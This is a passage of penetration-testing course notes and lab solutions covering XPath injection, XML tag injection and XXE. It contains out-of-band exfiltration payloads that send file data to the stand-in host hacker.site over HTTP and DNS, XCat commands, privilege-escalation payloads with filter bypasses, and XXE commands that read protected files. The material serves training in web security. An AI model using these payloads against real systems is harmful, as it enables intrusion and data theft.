+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/Employees/Employee[username="$_GET['c']"]
+</code></pre></div></div>
+
+<p><strong>base-uri</strong> is useful in detecting properties about URIs. Calling this function without passing any argument allows us to potentially obtain the full URI path of the current file:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>base-uri()
+# file://path/to/XMLfile.xml
+</code></pre></div></div>
+
+<h3 id="for-operator">FOR Operator</h3>
+<p>It enables iteration (looping) over sequences, therefore returning a new value For each repetition. The following XPath expression retrieves the list of usernames:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="nv">$x</span> <span class="k">in</span> /Employees/Employee <span class="k">return</span> <span class="nv">$x</span>/username
+</code></pre></div></div>
+
+<h3 id="conditional-expression">Conditional Expression</h3>
+<ul>
+  <li><strong>if</strong></li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="o">(</span><span class="nv">$employee</span>/role <span class="o">=</span> 2<span class="o">)</span>
+  <span class="k">then</span> <span class="nv">$employee</span>
+  <span class="k">else </span>0
+</code></pre></div></div>
+
+<h3 id="regular-expression">Regular Expression</h3>
+<p>Another useful improvement involves the ability to use Regular Expression syntax For pattern matching using the keywords <strong>matches</strong>, <strong>replace</strong>, or <strong>tokenize</strong>.</p>
+
+<ul>
+  <li>These functions used in conjunction with conditional operators and other quantifiers are great toolkits For attackers.</li>
+</ul>
+
+<h3 id="assembledisassemble-strings">Assemble/Disassemble Strings</h3>
+<p><strong>codepoints-to-string</strong> and <strong>string-to-codepoints</strong>.</p>
+
+<blockquote>
+  <p>They allow us to convert a string into a sequence of integer and respectively, from a sequence of integer returns a string:</p>
+</blockquote>
+
+<p><img src="/assets/images/posts/ewptx/16.png" alt="Alt text" class="align-center" /></p>
+
+<h3 id="data-types">Data Types</h3>
+<p>The first version of XPath supported four data types:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Number (floating-point)
+- String
+- Boolean
+- Node-Set
+</code></pre></div></div>
+
+<p>v2.0 introduced support For all simple primite types built into the XML schema in addition to 19 simple types, such as <strong>dates</strong>, <strong>URIs</strong>, etc</p>
+
+<p><img src="/assets/images/posts/ewptx/17.png" alt="Alt text" class="align-center" /></p>
+
+<p>Resource For Xpath:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.w3schools.com/xml/xpath_syntax.asp
+</code></pre></div></div>
+
+<h2 id="advanced-xpath-exploitation">Advanced XPath Exploitation</h2>
+
+<h3 id="blind-exploitation">Blind Exploitation</h3>
+
+<h4 id="error-based">Error Based:</h4>
+
+<ul>
+  <li>Like exploiting SQL injection, the <strong>error based extraction</strong> technique is suitable if, with an XPath query, we can generate a runtime error and this error is detectable is some way.</li>
+  <li>We want to configure our tests so that we trigger an error every time a specific condition is met.</li>
+</ul>
+
+<p><strong>error()</strong> raises an error and never returns a value which is exactly what we need FOr our tests</p>
+
+<p>For example:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>... and <span class="o">(</span><span class="k">if</span> <span class="o">(</span> <span class="nv">$employee</span>/role <span class="o">=</span> 2<span class="o">)</span> <span class="k">then </span>error<span class="o">()</span> <span class="k">else </span>0 <span class="o">)</span> ...
+</code></pre></div></div>
+
+<blockquote>
+  <p>The error can be shown in a <strong>div</strong>, as a 500 page, a custom HTTP status code, and / or many other methods</p>
+</blockquote>
+
+<h4 id="boolean-based">Boolean Based:</h4>
+
+<p>By leveraging various inference techniques, we have to extract information based on a set of focused deductions</p>
+
+<ul>
+  <li>The most used are: <strong>boolean-based</strong> and <strong>time-based</strong> techniques, however in XPath there are no features that allow us to handle delays, therefore we can only use the Boolean attacks.</li>
+  <li>For example: String Functions that use Pattern Matching are useful in reducing the character search space</li>
+</ul>
+
+<p>→ http://www.w3.org/TR/xpath-functions/#string.match</p>
+
+<p>While the Functions on String Values, such as <strong>normalize-unicode</strong>, etc. Are useful in handling all the possible encoding (impossible without these functions).</p>
+
+<p>→ http://www.w3.org/TR/xpath-functions/#string-value-functions</p>
+
+<h3 id="oob-exploitation">OOB Exploitation</h3>
+<p>in Xpath 2.0 = http://www.w3.org/TR/xpath-functions/#func-doc</p>
+
+<p><strong>doc($uri)</strong></p>
+
+<ul>
+  <li>If we are able to include a file, remotely or locally, in our target application, then we can do a lot of bad things and, of course, in this case , we can.</li>
+</ul>
+
+<p>With the <strong>doc</strong> function, we can read any local XML file:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>substring<span class="o">((</span>doc<span class="o">(</span><span class="s1">'file://protected/secret.xml'</span><span class="o">)</span>/<span class="k">*</span><span class="o">[</span>1]/<span class="k">*</span><span class="o">[</span>1]/text<span class="o">()[</span>1]<span class="o">)</span>,3,1<span class="o">)))</span> &lt; 127
+</code></pre></div></div>
+
+<h2 id="http-channel">HTTP Channel</h2>
+<p>We can trick the victim site into sending what we cant read to our controlled web server.</p>
+
+<p>Example using the doc():</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">doc</span><span class="p">(</span><span class="nf">concat</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://hacker.site/oob/</span><span class="dl">"</span><span class="p">,</span> <span class="nx">RESULTS_WE_WANT</span><span class="p">))</span>
+<span class="nf">doc</span><span class="p">(</span><span class="nf">concat</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://hacker.site/oob/</span><span class="dl">"</span><span class="p">,</span> <span class="sr">/Employees/</span><span class="nx">Employee</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">/</span><span class="nx">username</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>The URI has its rules and we need to encode out strings in order to make the format suitable For sending from the victim site to the attack site.</p>
+
+<p><strong>encode-for-uri</strong> function:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">doc</span><span class="p">(</span><span class="nf">concat</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://hacker.site/oob/</span><span class="dl">"</span><span class="p">,</span> <span class="nx">encode</span><span class="o">-</span><span class="k">for</span><span class="o">-</span><span class="nf">uri</span><span class="p">(</span><span class="sr">/Employees/</span><span class="nx">Employee</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">/</span><span class="nx">username</span><span class="p">)))</span>
+</code></pre></div></div>
+
+<p>Setting up a listening HTTP server is quite simple; however, if we are lazy, then we can use use ‘xxeserve’ or ‘xcat’</p>
+
+<p>→ xxeserve = https://github.com/joernchen/xxeserve</p>
+
+<p>→ xcat     = http://xcat.readthedocs.org/</p>
+
+<p>XCat is a command line tool that aides in the exploitation of Blind XPath injection flaws. Some features:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Advanced data postback through HTTP
+- Arbitrarily read XML/text files on the web server via the **doc() function** and crafted SYSTEM entities (XXE)
+</code></pre></div></div>
+
+<h3 id="dns-channel">DNS Channel</h3>
+<p>Often the HTTP channel is blocked by firewall or other filters</p>
+
+<ul>
+  <li>Usually even when we cant exfiltrate via HTTP, outgoing DNS queries are permitted access to arbitrary hosts.</li>
+  <li>So, instead of sending data as GET parameters, we use a controlled name server and force the victim site to resolve our domain with they juicy data as subdomain values, like:</li>
+</ul>
+
+<p>→ http://username.password.hacker.site</p>
+
+<ul>
+  <li>The length of any one label is limited to between 1 and 63 octets and globally, a full domain name, is limited to 255 octets(including the separators)</li>
+</ul>
+
+<blockquote>
+  <p>Since DNS primarily uses UDP, its not guaranteed that requests arrive at the attackers server. Think about network congestion or all the other possibilities that might cause data to get lost.</p>
+</blockquote>
+
+<h2 id="note-from-video-1">Note from Video</h2>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span> <span class="nx">and</span> <span class="nf">count</span><span class="p">(</span><span class="cm">/*[1]/*)=1
+# find the tree of the XML file
+
+... and substring(name(/*[1],1,1)='a'
+# guess the names
+
+in 2.0 we can use:
+... and string-to-codepoints(/*[1],1,1) &gt; 100
+
+# in this case codepoints.net can help us translate the values to strings
+</span></code></pre></div></div>
+
+<h3 id="to-exfiltrate-via-http">to exfiltrate via HTTP</h3>
+<p>Setup a web server in apache2</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span> <span class="nx">and</span> <span class="nf">doc</span><span class="p">(</span><span class="dl">'</span><span class="s1">http://hacker.site/OOB/test/request</span><span class="dl">'</span><span class="p">)</span>
+
+<span class="p">...</span> <span class="nx">and</span> <span class="nf">doc</span><span class="p">(</span><span class="nf">concat</span><span class="p">(</span><span class="dl">'</span><span class="s1">http://hacker.site</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">value1/</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">value2</span><span class="dl">'</span><span class="p">))</span>
+
+<span class="p">...</span> <span class="nx">and</span> <span class="nf">doc</span><span class="p">(</span><span class="nf">concat</span><span class="p">(</span><span class="dl">'</span><span class="s1">http://hacker.site</span><span class="dl">'</span><span class="p">,</span> <span class="nf">name</span><span class="p">(</span><span class="cm">/*)))
+# to discover the root name xml file
+
+... and doc(concat('http://hacker.site', name(/*[1]/*[1])))
+# u can discover the full tree name
+
+... and doc-available(concat('http://hacker.site', encode-for-uri(name(/*[1]/*[1]))))
+
+</span></code></pre></div></div>
+
+<h3 id="to-exfiltrate-via-dns">to exfiltrate via DNS</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt-get <span class="nb">install </span>maradns
+</code></pre></div></div>
+
+<p>Basically we will configure a functioning DNS like *.hacker.site</p>
+
+<ul>
+  <li>all subdomains will redirect to hacker.site</li>
+</ul>
+
+<p>Then we can exfiltrate the values of XML files in the subdomain spaces:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">and</span> <span class="nx">doc</span><span class="o">-</span><span class="nf">available</span><span class="p">(</span><span class="nf">concat</span><span class="p">(</span><span class="dl">'</span><span class="s1">http://</span><span class="dl">'</span><span class="p">,</span> <span class="nf">name</span><span class="p">(</span><span class="cm">/*),'.', '.__.hacker.site')
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>Dont forget the <strong>tail -f</strong> in the maradns log file to get the results</p>
+</blockquote>
+
+<ul>
+  <li>if we need to test space or others characters that are not allowed</li>
+</ul>
+
+<p>we need to get the value in codepoints.net and encode like</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl hello<span class="se">\3</span>2world.hacker.site
+</code></pre></div></div>
+
+<h3 id="using-automated-tool">Using automated Tool</h3>
+<p>Xcat:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python</span> <span class="n">run_xcat</span><span class="p">.</span><span class="n">py</span> <span class="o">--</span><span class="n">method</span> <span class="n">GET</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">xpath</span><span class="p">.</span><span class="n">hacker</span><span class="p">.</span><span class="n">site</span> <span class="n">title</span><span class="o">=</span><span class="n">Code</span> <span class="n">title</span> <span class="sh">"</span><span class="s">Brown</span><span class="sh">"</span> <span class="n">test_injection</span>
+<span class="n">python</span> <span class="n">run_xcat</span><span class="p">.</span><span class="n">py</span> <span class="o">--</span><span class="n">method</span> <span class="n">GET</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">xpath</span><span class="p">.</span><span class="n">hacker</span><span class="p">.</span><span class="n">site</span> <span class="n">title</span><span class="o">=</span><span class="n">Code</span> <span class="n">title</span> <span class="sh">"</span><span class="s">Brown</span><span class="sh">"</span> <span class="n">run</span>
+<span class="n">python</span> <span class="n">run_xcat</span><span class="p">.</span><span class="n">py</span> <span class="o">--</span><span class="n">method</span> <span class="n">GET</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">xpath</span><span class="p">.</span><span class="n">hacker</span><span class="p">.</span><span class="n">site</span> <span class="n">title</span><span class="o">=</span><span class="n">Code</span> <span class="n">title</span> <span class="sh">"</span><span class="s">Brown</span><span class="sh">"</span> <span class="n">run</span> <span class="n">retrieve</span> <span class="o">//</span><span class="n">this</span> <span class="n">will</span> <span class="n">retrieve</span> <span class="n">the</span> <span class="n">whole</span> <span class="nb">file</span>
+<span class="n">python</span> <span class="n">run_xcat</span><span class="p">.</span><span class="n">py</span> <span class="o">--</span><span class="n">public</span><span class="o">-</span><span class="n">ip</span> <span class="sh">"</span><span class="s">127.3.4.5</span><span class="sh">"</span> <span class="o">--</span><span class="n">method</span> <span class="n">GET</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">xpath</span><span class="p">.</span><span class="n">hacker</span><span class="p">.</span><span class="n">site</span> <span class="n">title</span><span class="o">=</span><span class="n">Code</span> <span class="n">title</span> <span class="sh">"</span><span class="s">Brown</span><span class="sh">"</span> <span class="n">run</span> <span class="n">retrieve</span>
+<span class="n">python</span> <span class="n">run_xcat</span><span class="p">.</span><span class="n">py</span> <span class="o">--</span><span class="n">method</span> <span class="n">GET</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">xpath</span><span class="p">.</span><span class="n">hacker</span><span class="p">.</span><span class="n">site</span> <span class="n">title</span><span class="o">=</span><span class="n">Code</span> <span class="n">title</span> <span class="sh">"</span><span class="s">Brown</span><span class="sh">"</span> <span class="n">run</span> <span class="n">file_shell</span>
+</code></pre></div></div>
+
+<h2 id="lab-1">Lab 1</h2>
+
+<h3 id="solutions---lab-1">Solutions - Lab #1</h3>
+
+<p>Simple XML TAG injection exploitation warm-up: <em>D0 u w@nn@ b3 a l33t m3mb3r?</em></p>
+
+<p>Background</p>
+
+<p>There are two types of users: leet and looser. By default, every new user is a looser. Find a way to become a leet member.
+Exploitation steps</p>
+
+<p>A valid XML structure is reported in the core.js file within the function <code class="language-plaintext highlighter-rouge">WSregister__old</code>.</p>
+
+<p>As you can see in the previous implementation, the developers used a different approach that helps us to detect the XML structure in this scenario.</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function WSregister__old() {
+...
+  var xml = '<span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> ';
+  xml += '<span class="nt">&lt;user&gt;</span>                                    ';
+  xml += '    <span class="nt">&lt;role&gt;</span>2<span class="nt">&lt;/role&gt;</span>                        ';
+  xml += '    <span class="nt">&lt;name&gt;</span>' + name + '<span class="nt">&lt;/name&gt;</span>             ';
+  xml += '    <span class="nt">&lt;username&gt;</span>' + username + '<span class="nt">&lt;/username&gt;</span> ';
+  xml += '    <span class="nt">&lt;password&gt;</span>' + password + '<span class="nt">&lt;/password&gt;</span> ';
+  xml += '<span class="nt">&lt;/user&gt;</span>                                   ';
+...
+}
+</code></pre></div></div>
+
+<p>Testing parameter name Registering:</p>
+
+<ul>
+  <li>If we register a user, we can see that its name is echoed back in the welcome message and is encoded with htmlspecialchars.</li>
+  <li>Furthermore, if we try to inject some tags (e.g., ), the application works and registers the new user. Therefore, this parameter is not injectable.</li>
+</ul>
+
+<p>Testing parameter password:</p>
+
+<ul>
+  <li>If we adopt the same approach with the password, we can see that even the password is not injectable!</li>
+</ul>
+
+<p>Testing parameter username:</p>
+
+<ul>
+  <li>The only injectable parameter is the username.</li>
+</ul>
+
+<p>If we take advantage of the XML structure found in the core.js file we could easily inject our leet user as follows:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>name:     useless
+username: useless<span class="nt">&lt;/username&gt;&lt;/user&gt;&lt;user&gt;&lt;rule&gt;</span>1<span class="nt">&lt;/rule&gt;&lt;name&gt;</span>l33t<span class="nt">&lt;/name&gt;&lt;username&gt;</span>l33t
+password: l33t
+
+The leet login will be:
+
+username: l33t
+password: l33t
+</code></pre></div></div>
+
+<h3 id="solutions---lab-2">Solutions - Lab #2</h3>
+
+<p>Simple XML TAG injection exploitation with length limitation: <em>Does Length Matter?</em></p>
+
+<p>Background</p>
+
+<p>There are two types of users: leet and looser. By default, every new user is a looser. Find a way to become a leet member.
+Exploitation steps</p>
+
+<p>A valid XML structure is reported in the core.js file within the function WSregister__old.</p>
+
+<p>As you can see in the previous implementation, the developers used a different approach than in this scenario, which helps us detect the XML structure:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function WSregister__old() { 
+  ...
+  var xml = '<span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> ';
+  xml += '<span class="nt">&lt;user&gt;</span>                                    '; 
+  xml += '    <span class="nt">&lt;role&gt;</span>2<span class="nt">&lt;/role&gt;</span>                        '; 
+  xml += '    <span class="nt">&lt;name&gt;</span>' + name + '<span class="nt">&lt;/name&gt;</span>             '; 
+  xml += '    <span class="nt">&lt;username&gt;</span>' + username + '<span class="nt">&lt;/username&gt;</span> '; 
+  xml += '    <span class="nt">&lt;password&gt;</span>' + password + '<span class="nt">&lt;/password&gt;</span> '; 
+  xml += '<span class="nt">&lt;/user&gt;</span>                                   '; 
+  ... 
+}
+</code></pre></div></div>
+
+<p>Testing parameter name:</p>
+
+<ul>
+  <li>Registering a test user, we can see that the name of the new user is echoed back in the welcome message and is encoded with htmlspecialchars.</li>
+</ul>
+
+<p>If we try to inject some tags (e.g., ), the application returns an error message:</p>
+
+<ul>
+  <li>Opening and ending tag mismatch …</li>
+</ul>
+
+<p>Testing parameter username:</p>
+
+<ul>
+  <li>If we adopt the same approach as before, we can see that even the username is injectable!</li>
+</ul>
+
+<p>Testing parameter password:</p>
+
+<ul>
+  <li>If we adopt the same approach as before, we can see that the password is not injectable!</li>
+</ul>
+
+<p>Length limitations:</p>
+
+<ul>
+  <li>We notice that the name and username have length limitations of 35 characters.</li>
+</ul>
+
+<blockquote>
+  <p>In fact, if we try to inject something longer, the application cuts/truncates our input.</p>
+</blockquote>
+
+<p>Since we have two injection points, to bypass this limitation we can split and inject our payload in the two places:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>name:     <span class="nt">&lt;/name&gt;&lt;/user&gt;&lt;user&gt;&lt;rule&gt;</span>1<span class="c">&lt;!--
+username: -- &gt;&lt;/rule&gt;&lt;name&gt;x&lt;/name&gt;&lt;username&gt;x
+password: l33t
+
+The leet login will be:
+
+username: x
+password: l33t
+</span></code></pre></div></div>
+
+<h3 id="solutions---lab-3">Solutions - Lab #3</h3>
+
+<p>XML TAG injection exploitation with length limitation and filters: <em>If youre tired .. have a break!</em></p>
+
+<p>Background</p>
+
+<p>There are two types of users: leet and looser. By default, every new user is a looser. Find a way to become a leet member.
+Exploitation steps</p>
+
+<p>A valid XML structure is reported in the core.js file within the function WSregister__old.</p>
+
+<p>As you can see in the previous implementation, the developers used a different approach than in this scenario, which helps us detect the XML structure.</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function WSregister__old() {
+  ...
+  var xml = '<span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> '; 
+  xml += '<span class="nt">&lt;user&gt;</span>                                    '; 
+  xml += '    <span class="nt">&lt;role&gt;</span>2<span class="nt">&lt;/role&gt;</span>                        '; 
+  xml += '    <span class="nt">&lt;name&gt;</span>' + name + '<span class="nt">&lt;/name&gt;</span>             '; 
+  xml += '    <span class="nt">&lt;username&gt;</span>' + username + '<span class="nt">&lt;/username&gt;</span> '; 
+  xml += '    <span class="nt">&lt;password&gt;</span>' + password + '<span class="nt">&lt;/password&gt;</span> '; 
+  xml += '<span class="nt">&lt;/user&gt;</span>                                   '; 
+  ...
+}
+</code></pre></div></div>
+
+<p>Testing parameter name:</p>
+
+<ul>
+  <li>Registering a test user, we can see that the name of the new user is echoed back in the welcome message and is encoded with htmlspecialchars. But, if we try to inject some tags (e.g., ),</li>
+</ul>
+
+<p>The application returns an error message like the following:</p>
+
+<ul>
+  <li>Opening and ending tag mismatch …</li>
+</ul>
+
+<p>Testing parameter name:</p>
+
+<ul>
+  <li>If we adopt the same approach as before, we can see that even the username is injectable!</li>
+</ul>
+
+<p>Testing parameter password:</p>
+
+<ul>
+  <li>If we adopt the same approach as before, we can see that the password is not injectable!</li>
+</ul>
+
+<p>Length limitations:</p>
+
+<ul>
+  <li>We notice that name and username have length limitations of 34 characters.</li>
+</ul>
+
+<blockquote>
+  <p>In fact, if we try to inject something longer, the application cuts/truncates our input.</p>
+</blockquote>
+
+<p>Since we have two injection points, to bypass this limitation we can split and inject our payload in the two places:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>name:     <span class="nt">&lt;/name&gt;&lt;/user&gt;&lt;user&gt;&lt;rule&gt;</span>1<span class="c">&lt;!--
+username: --&gt;</span><span class="nt">&lt;/rule&gt;&lt;name&gt;&lt;/name&gt;&lt;username&gt;</span>x
+password: l33t
+</code></pre></div></div>
+
+<p>Bypassing Filters:</p>
+
+<ul>
+  <li>Bypassing length limitations is not enough. The application implements some filters against the XML TAG injection that blocks the previous payload.</li>
+</ul>
+
+<p>In this case, if the filter detects some dangerous elements, it shows a message like the following:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>So you wanna be a l33t member so easily?! ಠ_ಠ
+
+# Injecting some metacharacters, we can see that <span class="err">&amp;</span>, \ , , , "" , '' are filtered but <span class="nt">&lt; and</span> <span class="nt">&gt;</span> are not!
+</code></pre></div></div>
+
+<p>There is another filter that blocks the and tags.</p>
+
+<p>The check is case-insensitive, and it seems that spaces and tabs are ignored between the tag name and the close tag character, but if we inject a new line, it is not filtered!</p>
+
+<p>So the exploitation could be the following:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>name:     <span class="nt">&lt;/name&gt;&lt;/user&gt;&lt;user&gt;&lt;rule</span><span class="err">{NEW_LINE}</span><span class="nt">&gt;</span>1<span class="c">&lt;!--
+username: --&gt;</span><span class="err">&lt;</span>/rule{NEW_LINE}&gt;<span class="nt">&lt;name&gt;&lt;/name&gt;&lt;username&gt;</span>x
+password: l33t
+</code></pre></div></div>
+
+<p>Now the username has a length of 35; injecting this payload, we would have an empty username and thus an invalid login.</p>
+
+<ul>
+  <li>We need to remove something from the payload, and the tag seems to be ignored server-side.</li>
+</ul>
+
+<p>The working exploit is:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>name:     <span class="nt">&lt;/name&gt;&lt;/user&gt;&lt;user&gt;&lt;rule</span><span class="err">{NEW_LINE}</span><span class="nt">&gt;</span>1<span class="c">&lt;!--
+username: --&gt;</span><span class="err">&lt;</span>/rule{NEW_LINE}&gt;<span class="nt">&lt;username&gt;</span>l33t
+password: l33t
+</code></pre></div></div>
+
+<p>Inside burp the request should look as follows:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /add_new.php HTTP/1.1
+...
+name=<span class="nt">&lt;/name&gt;&lt;/user&gt;&lt;user&gt;&lt;rule</span>
+<span class="nt">&gt;</span>1<span class="c">&lt;!--&amp;user=--&gt;</span><span class="nt">&lt;/rule
+&gt;&lt;username&gt;</span>l33t<span class="err">&amp;</span>password=l33t
+
+The leet login will be:
+
+username: l33t
+password: l33t 
+</code></pre></div></div>
+
+<h2 id="lab-2">Lab 2</h2>
+
+<p>Below, you can find solutions for each task. Remember, though, that you can follow your own strategy, which may be different from the one explained in the following lab.</p>
+
+<blockquote>
+  <p>NOTE: The techniques to use during this lab are better explained in the study material. You should refer to it for further details. These solutions are provided here only to verify the correctness.</p>
+</blockquote>
+
+<h3 id="solutions---lab-1-1">Solutions - Lab #1</h3>
+
+<p>Basic XXE exploitation: requires a file for the solution:</p>
+
+<p><em>Simple warm-up</em>
+Exploitation steps:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Download the content of .letmepass <span class="o">(</span>exploit.sh can be found at http://1.xxe.labs/solution/exploit.sh<span class="o">)</span>
+
+./exploit.sh <span class="o">{</span>DOCROOT<span class="o">}</span>/.letmepass
+</code></pre></div></div>
+
+<p>Extract the content from the result:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>Step 1] | <span class="nb">awk</span> <span class="s1">'match($0, /&lt;b&gt;XXEME (.*)&lt;\\\/b&gt;/, m) { print m[1] }'</span>
+
+OR
+
+<span class="o">[</span>Step 1] | gawk <span class="s1">'match($0, /&lt;b&gt;XXEME (.*)&lt;\\\/b&gt;/, m) { print m[1] }'</span>
+</code></pre></div></div>
+
+<p>Remove JSON escaping characters:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>Steps 1|2] | <span class="nb">sed</span> <span class="s1">'s/\\\//\//g'</span>
+</code></pre></div></div>
+
+<p>Testing command:</p>
+
+<p>Note: this is GNU-based awk command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./exploit.sh /var/www/1/.letmepass <span class="se">\</span>
+| <span class="nb">awk</span> <span class="s1">'match($0, /&lt;b&gt;XXEME (.*)&lt;\\\/b&gt;/, m) { print m[1] }'</span> <span class="se">\</span>
+| <span class="nb">sed</span> <span class="s1">'s/\\\//\//g'</span>
+</code></pre></div></div>
+
+<h3 id="solutions---lab-2-1">Solutions - Lab #2</h3>
+
+<p>Basic XXE exploitation and basic curl with base64 encoded solution:</p>
+
+<p><em>Simple (encoded) warm-up</em></p>
+
+<p>Valid passphrase</p>
+
+<p>The hidden username is theOhpe that base64-encoded is: <strong>dGhlT2hwZQ==</strong>.</p>
+
+<p>To retrieve the value, it is required to perform a DELETE request to the whois.php script.
+Exploitation steps</p>
+
+<p>Download the content of .letmepass:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./exploit.sh <span class="o">{</span>DOCROOT<span class="o">}</span>/.letmepass
+</code></pre></div></div>
+
+<p>Extract the content from the result:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>Step 1] | gawk <span class="s1">'match($0, /&lt;b&gt;XXEME (.*)&lt;\\\/b&gt;/, m) { print m[1] }'</span>
+</code></pre></div></div>
+
+<p>Remove JSON escaping characters:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>Steps 1|2] | <span class="nb">sed</span> <span class="s1">'s/\\\//\//g'</span>
+</code></pre></div></div>
+
+<p>Retrieve the content of whois.php using the DELETE verb:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="s2">"http://2.xxe.labs/whois.php"</span> <span class="nt">-X</span> DELETE
+</code></pre></div></div>
+
+<ul>
+  <li>Base64 decode and store the result in a file.</li>
+</ul>
+
+<blockquote>
+  <p>The base64 command has different implementations; therefore, you may need one of these two switches to decode:</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>Steps 1|2|3] | <span class="nb">base64</span> <span class="nt">-d</span>
+
+OR
+
+<span class="o">[</span>Steps 1|2|3] | <span class="nb">base64</span> <span class="nt">-D</span>
+</code></pre></div></div>
+
+<p>Testing command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./exploit.sh php://filter/convert.base64-encode/resource<span class="o">=</span>/var/www/xxe/2/.letmepass <span class="se">\</span>
+| <span class="nb">awk</span> <span class="s1">'match($0, /&lt;b&gt;XXEME (.*)&lt;\\\/b&gt;/, m) { print m[1] }'</span> <span class="se">\</span>
+| <span class="nb">sed</span> <span class="s1">'s/\\\//\//g'</span>
+
+curl <span class="nt">-s</span> <span class="s1">'http://2.xxe.labs/whois.php'</span> <span class="nt">-X</span> DELETE | <span class="nb">base64</span> <span class="nt">-d</span>
+</code></pre></div></div>
+
+<h3 id="solutions---lab-3-1">Solutions - Lab #3</h3>
+
+<p><em>The solution is encoded and obfuscated in a php file</em></p>
+
+<p>Dont break my XML:</p>
+
+<p>Exploitation steps</p>
+
+<p>Download base64 encoded the content of .letmepass:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./exploit.sh php://filter/convert.base64-encode/resource<span class="o">=</span>/var/www/3/.letmepass.php
+</code></pre></div></div>
+
+<p>Extract the content from the result:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>Step 1] | gawk <span class="s1">'match($0, /&lt;b&gt;XXEME (.*)&lt;\\\/b&gt;/, m) { print m[1] }'</span>
+</code></pre></div></div>
+
+<p>Remove JSON escaping characters:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>Steps 1|2] | <span class="nb">sed</span> <span class="s1">'s/\\\//\//g'</span>
+</code></pre></div></div>
+
+<p>Base64 decode and store result within a file:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>Steps 1|2|3] | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> whaat.php
+
+OR
+
+<span class="o">[</span>Steps 1|2|3] | <span class="nb">base64</span> <span class="nt">-D</span> <span class="o">&gt;</span> whaat.php
+</code></pre></div></div>
+
+<p>De-obfuscate the $config variable and execute the php script:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'var_dump($config);'</span> <span class="o">&gt;&gt;</span> whaat.php | php whaat.php
+</code></pre></div></div>
+
+<p>Testing command:</p>
